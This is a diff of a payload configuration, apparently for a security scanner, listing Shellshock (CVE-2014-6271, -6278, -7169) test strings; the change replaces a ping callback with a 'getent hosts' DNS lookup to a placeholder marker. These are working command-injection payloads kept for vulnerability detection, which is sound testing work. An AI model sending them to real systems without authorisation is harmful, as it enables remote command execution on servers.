@@ -22,10 +22,10 @@ generate:
     - replace
   - payload:
     #CVE 2014-6271
-    - "() { :; }; echo; PATH=/usr/bin:/usr/local/bin:/bin; export PATH ;bash -c 'ping -c1 DNS_MARKER'"
+    - "() { :; }; echo; PATH=/usr/bin:/usr/local/bin:/bin; export PATH ;bash -c 'getent hosts DNS_MARKER'"
     - "() { :; }; echo; echo $((CALC_MARKER))"
     #CVE-2014-6278
-    - "() { _; } >_[$($())] { echo; PATH=/usr/bin:/usr/local/bin:/bin; bash -c 'ping -c1 DNS_MARKER'; }"
+    - "() { _; } >_[$($())] { echo; PATH=/usr/bin:/usr/local/bin:/bin; bash -c 'getent hosts DNS_MARKER'; }"
     - "() { _; } >_[$($())] { echo; echo $((CALC_MARKER)); }"
     #CVE-2014-7169
     - "() { (a)=>' echo -e \"Content-Type: text/plain\n\"; echo $((CALC_MARKER))"
